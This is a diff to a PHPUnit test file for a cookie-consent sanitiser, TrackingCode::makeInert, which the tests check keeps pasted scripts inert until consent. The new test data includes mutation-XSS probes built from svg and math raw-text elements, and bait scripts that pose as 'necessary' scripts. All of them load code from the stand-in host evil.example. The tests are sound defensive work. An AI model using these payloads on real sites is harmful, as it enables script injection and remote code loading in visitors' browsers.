@@ -20,28 +20,46 @@ final class TrackingCodeTest extends TestCase
     }
 
     /**
-     * Re-parses the output the way a browser would and checks that nothing can run before consent: every script
-     * is either inert (type text/plain plus our category) or of a type no browser executes.
+     * @return list<\Dom\ParentNode> the output parsed three ways: as a fragment, and as the body and as the head
+     *                               of a full document (a browser parses the page as a document, and the two
+     *                               differ for foreign content)
      */
-    private function assertAllScriptsInert(string $output, string $category = 'analytics', int $atLeast = 0): void
+    private function parses(string $output): array
     {
         $holder = \Dom\HTMLDocument::createEmpty()->createElement('div');
         $holder->innerHTML = $output;
 
-        $scripts = iterator_to_array($holder->querySelectorAll('script'));
+        return [
+            $holder,
+            \Dom\HTMLDocument::createFromString('<!DOCTYPE html><html><head></head><body>' . $output . '</body></html>', LIBXML_NOERROR),
+            \Dom\HTMLDocument::createFromString('<!DOCTYPE html><html><head>' . $output . '</head><body></body></html>', LIBXML_NOERROR),
+        ];
+    }
 
-        $this->assertGreaterThanOrEqual($atLeast, count($scripts));
+    /**
+     * Re-parses the output the way a browser would (fragment, full-document body, full-document head) and checks
+     * that nothing can run before consent: every script is either inert (type text/plain plus our category) or of
+     * a type no browser executes.
+     */
+    private function assertAllScriptsInert(string $output, string $category = 'analytics', int $atLeast = 0): void
+    {
+        foreach ($this->parses($output) as $context => $root) {
+            $scripts = iterator_to_array($root->querySelectorAll('script'));
+            $label = $context . ': ' . $output;
 
-        foreach ($scripts as $script) {
-            $this->assertFalse($this->runs($script->getAttribute('type')), $output);
+            $this->assertGreaterThanOrEqual($atLeast, count($scripts), $label);
 
-            if ($script->getAttribute('data-cmk-category') !== null) {
-                $this->assertSame('text/plain', $script->getAttribute('type'), $output);
-                $this->assertSame($category, $script->getAttribute('data-cmk-category'), $output);
+            foreach ($scripts as $script) {
+                $this->assertFalse($this->runs($script->getAttribute('type')), $label);
+
+                if ($script->getAttribute('data-cmk-category') !== null) {
+                    $this->assertSame('text/plain', $script->getAttribute('type'), $label);
+                    $this->assertSame($category, $script->getAttribute('data-cmk-category'), $label);
+                }
             }
-        }
 
-        $this->assertSame(0, $holder->querySelectorAll('noscript')->length, $output);
+            $this->assertSame(0, $root->querySelectorAll('noscript')->length, $label);
+        }
     }
 
     /**
@@ -79,6 +97,22 @@ final class TrackingCodeTest extends TestCase
         }
 
         return $found;
+    }
+
+    /**
+     * @return array<string, array{string}>
+     */
+    private static function foreignRawTextProbes(): array
+    {
+        $probes = [];
+
+        foreach (['svg', 'math'] as $foreign) {
+            foreach (['title', 'xmp', 'iframe', 'noembed', 'textarea'] as $raw) {
+                $probes[$foreign . ' ' . $raw . ' attribute'] = ['<' . $foreign . '></p><' . $raw . '><a id="</' . $raw . '><script src=//evil.example/y.js></script>">'];
+            }
+        }
+
+        return $probes;
     }
     /**
      * @return array<string, array{string}>
@@ -119,12 +153,11 @@ final class TrackingCodeTest extends TestCase
         $this->assertAllScriptsInert(TrackingCode::makeInert($code, 'analytics'));
     }
 
-    public function testScriptsInsideSvgAndTemplateAreHandled(): void
+    public function testScriptsInsideTemplateAreHandledAndSvgIsRefused(): void
     {
-        // Observed: an SVG script is a script element in the SVG namespace and is still tagged; a template's
-        // content is a separate fragment, and its scripts are tagged too so a later clone cannot run them.
-        $svg = TrackingCode::makeInert('<svg><script>x</script></svg>', 'analytics');
-        $this->assertAllScriptsInert($svg, 'analytics', 1);
+        // Foreign content is refused outright (see the svg/math tests); a template's content is a separate
+        // fragment, and its scripts are tagged too so a later clone cannot run them.
+        $this->assertSame('', TrackingCode::makeInert('<svg><script>x</script></svg>', 'analytics'));
 
         $template = TrackingCode::makeInert('<template><script src=a.js></script></template>', 'analytics');
         $this->assertSame(
@@ -319,6 +352,68 @@ final class TrackingCodeTest extends TestCase
         $this->assertSame($block, TrackingCode::makeInert($block, 'analytics', 'abcd1234EFGH'));
     }
 
+    /**
+     * @return array<string, array{string}>
+     */
+    public static function pastedLoaderBaits(): array
+    {
+        return [
+            'text/plain necessary' => ['<script type="text/plain" data-cmk-category="necessary" src="//evil.example/a.js"></script>'],
+            'uppercase TEXT/PLAIN' => ['<script type="TEXT/PLAIN" data-cmk-category="necessary" src="//evil.example/a.js"></script>'],
+            'padded type' => ['<script type=" text/plain " data-cmk-category="necessary" src="//evil.example/a.js"></script>'],
+            'with remembered type' => ['<script type="text/plain" data-cmk-category="necessary" data-cmk-type="module" src="//evil.example/a.js"></script>'],
+            'uppercase attribute names' => ['<script type="text/plain" DATA-CMK-CATEGORY="necessary" Data-Cmk-Type="module" src="//evil.example/a.js"></script>'],
+            'other data type' => ['<script type="application/ld+json" data-cmk-category="necessary">{}</script>'],
+        ];
+    }
+
+    #[\PHPUnit\Framework\Attributes\DataProvider('pastedLoaderBaits')]
+    public function testPastedCmkAttributesAreStrippedFromUntouchedScripts(string $bait): void
+    {
+        foreach ([null, 'abcd1234EFGH'] as $nonce) {
+            $output = TrackingCode::makeInert($bait, 'analytics', $nonce);
+
+            $this->assertStringNotContainsStringIgnoringCase('data-cmk-', $output);
+            $this->assertStringNotContainsString('necessary', $output);
+            $this->assertStringContainsString('<script', $output);
+        }
+    }
+
+    public function testPastedNonceIsRemovedFromAPlainTextScriptButNotFromOtherDataBlocks(): void
+    {
+        $plain = TrackingCode::makeInert('<script type=" Text/Plain " nonce="pasted-nonce-1" id="p">x</script>', 'analytics', 'abcd1234EFGH');
+        $this->assertSame('<script type=" Text/Plain " id="p">x</script>', $plain);
+
+        $ld = '<script type="application/ld+json" nonce="pasted-nonce-1" data-x="1">{}</script>';
+        $this->assertSame($ld, TrackingCode::makeInert($ld, 'analytics', 'abcd1234EFGH'));
+    }
+
+    public function testLdJsonKeepsEverythingButCmkAttributes(): void
+    {
+        $output = TrackingCode::makeInert('<script type="application/ld+json" id="org" data-cmk-category="necessary" nonce="n1n1n1n1" data-x="1">{"@type":"Thing"}</script>', 'analytics');
+
+        $this->assertSame('<script type="application/ld+json" id="org" nonce="n1n1n1n1" data-x="1">{"@type":"Thing"}</script>', $output);
+    }
+
+    public function testLoaderContractOnlyOurOwnScriptsMatchTheActivationSelector(): void
+    {
+        $code = '<script>a()</script>'
+            . '<script type="text/plain" data-cmk-category="necessary" src="//evil.example/a.js"></script>'
+            . '<script type="TEXT/PLAIN" data-cmk-category="necessary">b()</script>';
+        $output = TrackingCode::makeInert($code, 'analytics', 'abcd1234EFGH');
+
+        foreach ($this->parses($output) as $root) {
+            $matched = $root->querySelectorAll('script[type="text/plain"][data-cmk-category]');
+
+            $this->assertSame(1, $matched->length, $output);
+            $this->assertSame('analytics', $matched[0]->getAttribute('data-cmk-category'));
+            $this->assertSame('abcd1234EFGH', $matched[0]->getAttribute('nonce'));
+            $this->assertNull($matched[0]->getAttribute('src'));
+        }
+
+        $this->assertStringNotContainsString('necessary', $output);
+    }
+
     public function testMixedSnippetOnlyInertsTheExecutableScript(): void
     {
         $ld = '<script type="application/ld+json">{"@type":"Thing"}</script>';
@@ -367,7 +462,21 @@ final class TrackingCodeTest extends TestCase
         return [
             'svg style attribute' => ['<svg></p><style><a id="</style><script src=//evil.example/y.js></script>">'],
             'math mglyph' => ['<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;/mglyph&gt;&lt;script src=//evil.example/x.js&gt;&lt;/script&gt;">'],
+            'math style attribute' => ['<math></p><style><a id="</style><script src=//evil.example/y.js></script>">'],
+            ...self::foreignRawTextProbes(),
         ];
+    }
+
+    #[\PHPUnit\Framework\Attributes\DataProvider('roundTripProbes')]
+    public function testFullDocumentProbesAreRefusedBecauseTheyContainForeignContent(string $code): void
+    {
+        $this->assertSame('', TrackingCode::makeInert($code, 'analytics', 'abcd1234EFGH'));
+    }
+
+    public function testEvenAHarmlessSvgLogoSnippetIsRefusedBecauseForeignContentIsNeverAllowed(): void
+    {
+        $this->assertSame('', TrackingCode::makeInert('<svg width="1" height="1"><circle r="1"/></svg><script>a()</script>', 'analytics'));
+        $this->assertSame('', TrackingCode::makeInert('<math><mi>x</mi></math>', 'analytics'));
     }
 
     #[\PHPUnit\Framework\Attributes\DataProvider('roundTripProbes')]
@@ -385,7 +494,7 @@ final class TrackingCodeTest extends TestCase
         $this->assertAllScriptsInert($output);
     }
 
-    public function testOutputIsAFixedPoint(): void
+    public function testOutputIsStableAndRepastedOutputLosesItsCategory(): void
     {
         foreach ([
             '<script>a()</script><meta name="x" content="y"><script type="module" src="/m.js"></script>',
@@ -393,7 +502,32 @@ final class TrackingCodeTest extends TestCase
         ] as $code) {
             $once = TrackingCode::makeInert($code, 'analytics', 'abcd1234EFGH');
             $this->assertNotSame('', $once);
-            $this->assertSame($once, TrackingCode::makeInert($once, 'analytics', 'abcd1234EFGH'));
+            $this->assertSame($once, TrackingCode::makeInert($code, 'analytics', 'abcd1234EFGH'));
+            // Pasted text/plain scripts are never trusted, ours included: the internal fixed-point check
+            // (verify) is the only place our own category is recognised.
+            $this->assertStringNotContainsString('data-cmk-category', TrackingCode::makeInert($once, 'analytics', 'abcd1234EFGH'));
         }
+    }
+
+    public function testForeignContentInsideTemplatesIsRefusedBecauseVerifyCannotSeeInsideThem(): void
+    {
+        $probe = '<svg></p><style><a id="</style><script src=//evil.example/y.js></script>">';
+
+        foreach ([
+            '<template>' . $probe . '</template>',
+            '<template><template>' . $probe . '</template></template>',
+            '<select><template>' . $probe . '</template></select>',
+            '<template><math>x</math></template>',
+        ] as $code) {
+            $this->assertSame('', TrackingCode::makeInert($code, 'analytics', 'abcd1234EFGH'), $code);
+        }
+    }
+
+    public function testATemplateWithoutForeignContentIsStillRewritten(): void
+    {
+        $this->assertSame(
+            '<template><script src="a.js" type="text/plain" data-cmk-category="analytics"></script><p>x</p></template>',
+            TrackingCode::makeInert('<template><script src=a.js></script><p>x</p></template>', 'analytics'),
+        );
     }
 }
